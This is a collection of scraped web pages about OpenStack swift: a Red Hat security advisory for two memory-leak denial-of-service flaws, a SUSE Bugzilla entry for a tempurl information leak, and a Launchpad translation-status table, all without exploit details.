* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2016:0329 - Security Advisory

Issued:
2016-03-01
Updated:
2016-03-01
# RHSA-2016:0329 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Moderate: openstack-swift security update

## Type/Severity

Security Advisory: Moderate

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A0329)

## Topic

Updated openstack-swift packages that fix two security issues are now
available for Red Hat Gluster Storage 3.1 update 2 in Red Hat Enterprise
Linux 6.

Red Hat Product Security has rated this update as having Moderate security
impact. Common Vulnerability Scoring System (CVSS) base scores, which give
detailed severity ratings, are available for each vulnerability from the
CVE links in the References section.

## Description

OpenStack Object Storage (swift) provides object storage in virtual
containers, which allows users to store and retrieve files (arbitrary
data). The service's distributed architecture supports horizontal scaling;
redundancy as failure-proofing is provided through software-based data
replication. Because Object Storage supports asynchronous eventual
consistency replication, it is well suited to multiple data-center
deployment.

A memory-leak issue was found in OpenStack Object Storage (swift), in the
proxy-to-server connection. An OpenStack-authenticated attacker could
remotely trigger this flaw to cause denial of service through excess memory
consumption. (CVE-2016-0738)

A memory-leak issue was found in OpenStack Object Storage (swift), in the
client-to-proxy connection. An OpenStack-authenticated attacker could
remotely trigger this flaw to cause denial of service through excess memory
consumption. (CVE-2016-0737)

Red Hat would like to thank the OpenStack project for reporting these
issues. Upstream acknowledges Romain Le Disez from OVH and Örjan Persson
from Kiliaro as the original reporters.

All users of openstack-swift are advised to upgrade to these updated
packages, which correct these issues. After installing this update, the
OpenStack Object Storage services will be restarted automatically.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

For details on how to apply this update, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat Gluster Storage Server for On-premise 3 for RHEL 6 x86\_64

## Fixes

* [BZ - 1298905](https://bugzilla.redhat.com/show_bug.cgi?id=1298905)
  - CVE-2016-0738 openstack-swift: Proxy to server DoS through Large Objects
* [BZ - 1298924](https://bugzilla.redhat.com/show_bug.cgi?id=1298924)
  - CVE-2016-0737 openstack-swift: Client to proxy DoS through Large Objects

## CVEs

* [CVE-2015-5223](https://www.redhat.com/security/data/cve/CVE-2015-5223.html)
* [CVE-2016-0737](https://www.redhat.com/security/data/cve/CVE-2016-0737.html)
* [CVE-2016-0738](https://www.redhat.com/security/data/cve/CVE-2016-0738.html)

## References

* <http://www.redhat.com/security/updates/classification/#normal>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Gluster Storage Server for On-premise 3 for RHEL 6

| SRPM | |
| --- | --- |
| openstack-swift-1.13.1-8.el6ost.src.rpm | SHA-256: 18d3130ee4e4fda4bf4067c57d83c0f513e37de83bd298428b14ec26984ac9b9 |
| x86\_64 | |
| openstack-swift-1.13.1-8.el6ost.noarch.rpm | SHA-256: 1bec3aff2d0122a9c9088ef68164e93113d891b44a4110799708bf2d91d44392 |
| openstack-swift-account-1.13.1-8.el6ost.noarch.rpm | SHA-256: f1e5a8f9540e836d0b6f60b7ff0a0dac5278e77466bb5742b1dd5991bde45ea3 |
| openstack-swift-container-1.13.1-8.el6ost.noarch.rpm | SHA-256: a47257654d58de7501a7b61bbfb70d7c28ba0470abc3ac1304d43c879ba1b87c |
| openstack-swift-doc-1.13.1-8.el6ost.noarch.rpm | SHA-256: 2632773d6341f6a21e31687084f2ca85f29e6f0ae447ffa386df856735216682 |
| openstack-swift-object-1.13.1-8.el6ost.noarch.rpm | SHA-256: ecd7963389ef04e4a037bd362f25c5f63c4581d8e7f8044ea9a3c60412a517e4 |
| openstack-swift-proxy-1.13.1-8.el6ost.noarch.rpm | SHA-256: 69631a5077373b493fd9e0e00b43dd609aa5dd951eb0079850e8b9ed3b5a7091 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from bugzilla.suse.com_35cde851_20250126_062854.html ===


| Bugzilla – Bug 942641 | VUL-0: CVE-2015-5223: openstack-swift: Information leak via Swift tempurls | Last modified: 2016-04-27 19:44:20 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D942641)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 942641**](show_bug.cgi?id=942641)
(CVE-2015-5223)
- VUL-0: CVE-2015-5223: openstack-swift: Information leak via Swift tempurls

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2015-5223: openstack-swift: Information leak via Swift tempurls

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2015-5223 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P3 - Medium **Severity**: Major | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | CVSSv2:RedHat:CVE-2015-5223:4.3:(AV:N... | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2015-08-21 08:55 UTC by Andreas Stieger | | --- | --- | | Modified: | 2016-04-27 19:44 UTC ([History](show_activity.cgi?id=942641)) | | CC List: | 3 users (show)  astieger cloud-bugs vpereira | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | Security Response Team | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=942641) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=942641&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=942641&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Comment 4](show_bug.cgi?id=942641#c4)  Swamp Workflow Management   2015-08-21 22:00:31 UTC  ``` bugbot adjusting priority ``` [Comment 10](show_bug.cgi?id=942641#c10)  Swamp Workflow Management   2015-10-30 11:10:24 UTC  ``` SUSE-SU-2015:1846-1: An update that fixes three vulnerabilities is now available.  Category: security (important) Bug References: 900253,927793,942641 CVE References: CVE-2014-7960,CVE-2015-1856,CVE-2015-5223 Sources used: SUSE OpenStack Cloud 5 (src):    openstack-swift-2.1.0-11.1, openstack-swift-doc-2.1.0-11.1 ``` [Comment 11](show_bug.cgi?id=942641#c11)  Victor Pereira   2015-11-19 12:19:01 UTC  ``` fixed and released. ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=942641)
* - [XML](show_bug.cgi?ctype=xml&id=942641)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=942641)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D942641)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from www.redhat.com_c9d4c12c_20250126_062828.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from translations.launchpad.net_5415a748_20250126_062835.html ===

[Log in / Register](https://translations.launchpad.net/swift/%2Blogin)

[![](https://launchpadlibrarian.net/52141984/os64.png)](https://launchpad.net/swift)

## [OpenStack Object Storage (swift)](https://launchpad.net/swift)

* [Overview](https://launchpad.net/swift)
* [Code](https://code.launchpad.net/swift)
* [Bugs](https://bugs.launchpad.net/swift)
* [Blueprints](https://blueprints.launchpad.net/swift)
* Translations
* [Answers](https://answers.launchpad.net/swift)

# Translation overview

[Help for translations](https://help.launchpad.net/Translations)

### Translation details

Launchpad currently recommends translating
[OpenStack Object Storage (swift) trunk series](/swift/trunk).

To see all the translation files that are waiting to be
imported, please look at
[OpenStack Object Storage (swift) import queue](/swift/%2Bimports).

### Permissions

[OpenStack Object Storage (swift)](https://launchpad.net/swift) is translated
with [Open](/%2Bhelp-translations/permissions-policies.html)
permissions.

### All translatable series

* [OpenStack Object Storage (swift) trunk series](/swift/trunk/%2Btranslations)

### All translatable distribution packages

* [swift source package in Plucky](/ubuntu/plucky/%2Bsources/swift/%2Btranslations)
* [swift source package in Oracular](/ubuntu/oracular/%2Bsources/swift/%2Btranslations)
* [swift source package in Noble](/ubuntu/noble/%2Bsources/swift/%2Btranslations)
* [swift source package in Mantic](/ubuntu/mantic/%2Bsources/swift/%2Btranslations)
* [swift source package in Lunar](/ubuntu/lunar/%2Bsources/swift/%2Btranslations)
* [swift source package in Kinetic](/ubuntu/kinetic/%2Bsources/swift/%2Btranslations)
* [swift source package in Jammy](/ubuntu/jammy/%2Bsources/swift/%2Btranslations)
* [swift source package in Impish](/ubuntu/impish/%2Bsources/swift/%2Btranslations)
* [swift source package in Hirsute](/ubuntu/hirsute/%2Bsources/swift/%2Btranslations)
* [swift source package in Groovy](/ubuntu/groovy/%2Bsources/swift/%2Btranslations)
* [swift source package in Focal](/ubuntu/focal/%2Bsources/swift/%2Btranslations)
* [swift source package in Eoan](/ubuntu/eoan/%2Bsources/swift/%2Btranslations)
* [swift source package in Disco](/ubuntu/disco/%2Bsources/swift/%2Btranslations)
* [swift source package in Cosmic](/ubuntu/cosmic/%2Bsources/swift/%2Btranslations)
* [swift source package in Bionic](/ubuntu/bionic/%2Bsources/swift/%2Btranslations)
* [swift source package in Artful](/ubuntu/artful/%2Bsources/swift/%2Btranslations)
* [swift source package in Zesty](/ubuntu/zesty/%2Bsources/swift/%2Btranslations)
* [swift source package in Yakkety](/ubuntu/yakkety/%2Bsources/swift/%2Btranslations)
* [swift source package in Xenial](/ubuntu/xenial/%2Bsources/swift/%2Btranslations)
* [swift source package in Wily](/ubuntu/wily/%2Bsources/swift/%2Btranslations)
* [swift source package in Vivid](/ubuntu/vivid/%2Bsources/swift/%2Btranslations)
* [swift source package in Utopic](/ubuntu/utopic/%2Bsources/swift/%2Btranslations)
* [swift source package in Trusty](/ubuntu/trusty/%2Bsources/swift/%2Btranslations)
* [swift source package in Saucy](/ubuntu/saucy/%2Bsources/swift/%2Btranslations)
* [swift source package in Raring](/ubuntu/raring/%2Bsources/swift/%2Btranslations)
* [swift source package in Quantal](/ubuntu/quantal/%2Bsources/swift/%2Btranslations)
* [swift source package in Precise](/ubuntu/precise/%2Bsources/swift/%2Btranslations)

## Translation for trunk

| Language | Status | Untranslated | Needs review | Last Changed |
| --- | --- | --- | --- | --- |
| [Afrikaans](/swift/trunk/%2Bpots/swift/af/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/af/%2Btranslate?show=untranslated) | 196 [196](/swift/trunk/%2Bpots/swift/af/%2Btranslate?show=new_suggestions) | 2022-11-21 19:18:24 UTC 2022-11-21 |
| [Albanian](/swift/trunk/%2Bpots/swift/sq/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/sq/%2Btranslate?show=untranslated) | 3 [3](/swift/trunk/%2Bpots/swift/sq/%2Btranslate?show=new_suggestions) | 2012-02-25 15:12:23 UTC 2012-02-25 |
| [Belarusian](/swift/trunk/%2Bpots/swift/be/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/be/%2Btranslate?show=untranslated) | 27 [27](/swift/trunk/%2Bpots/swift/be/%2Btranslate?show=new_suggestions) | 2020-05-03 16:45:26 UTC 2020-05-03 |
| [Bosnian](/swift/trunk/%2Bpots/swift/bs/%2Btranslate) | 196 000.00  100.0% translated | 0 0 | 0 0 | 2012-12-12 20:23:19 UTC 2012-12-12 |
| [Brazilian Portuguese](/swift/trunk/%2Bpots/swift/pt_BR/%2Btranslate) | 144 026.53  73.46938775510205% translated  26.53061224489796% untranslated | 52 [52](/swift/trunk/%2Bpots/swift/pt_BR/%2Btranslate?show=untranslated) | 60 [60](/swift/trunk/%2Bpots/swift/pt_BR/%2Btranslate?show=new_suggestions) | 2012-04-01 03:15:49 UTC 2012-04-01 |
| [Chechen](/swift/trunk/%2Bpots/swift/ce/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/ce/%2Btranslate?show=untranslated) | 0 0 | 2014-08-13 08:13:41 UTC 2014-08-13 |
| [Chinese (Simplified)](/swift/trunk/%2Bpots/swift/zh_CN/%2Btranslate) | 196 000.00  100.0% translated | 0 0 | 90 [90](/swift/trunk/%2Bpots/swift/zh_CN/%2Btranslate?show=new_suggestions) | 2013-05-02 04:27:30 UTC 2013-05-02 |
| [Chinese (Traditional)](/swift/trunk/%2Bpots/swift/zh_TW/%2Btranslate) | 113 042.35  57.6530612244898% translated  42.3469387755102% untranslated | 83 [83](/swift/trunk/%2Bpots/swift/zh_TW/%2Btranslate?show=untranslated) | 21 [21](/swift/trunk/%2Bpots/swift/zh_TW/%2Btranslate?show=new_suggestions) | 2015-10-08 18:37:15 UTC 2015-10-08 |
| [Czech](/swift/trunk/%2Bpots/swift/cs/%2Btranslate) | 196 000.00  100.0% translated | 0 0 | 0 0 | 2012-07-08 19:46:11 UTC 2012-07-08 |
| [Dutch](/swift/trunk/%2Bpots/swift/nl/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/nl/%2Btranslate?show=untranslated) | 4 [4](/swift/trunk/%2Bpots/swift/nl/%2Btranslate?show=new_suggestions) | 2019-05-17 14:23:46 UTC 2019-05-17 |
| [English (Australia)](/swift/trunk/%2Bpots/swift/en_AU/%2Btranslate) | 0 100.00  100.0% untranslated | 196 [196](/swift/trunk/%2Bpots/swift/en_AU/%2Btranslate?show=untranslated) | 196 [196](/swift/trunk/%2Bpots/swift/en_AU/%2Btranslate?show=new_suggestions) | 2012-02-02 12:37:39 UTC 2012-02-02 |
| [English (United Kingdom)](/swift/trunk/%2Bpots/swift/en_GB/%2Btranslate) | 84 057.14  42.857142857142854% translated  57.14285714285714% untranslated | 112 [112](/swift/trunk/%2Bpots/swift/en_GB/%2Btranslate?show=untranslated) | 112 [112](/swift/trunk/%2Bpots/swift/en_GB/%2Btranslate?show=new_suggestions) | 2012-12-26 23:32:50 UTC 2012-12-26 |
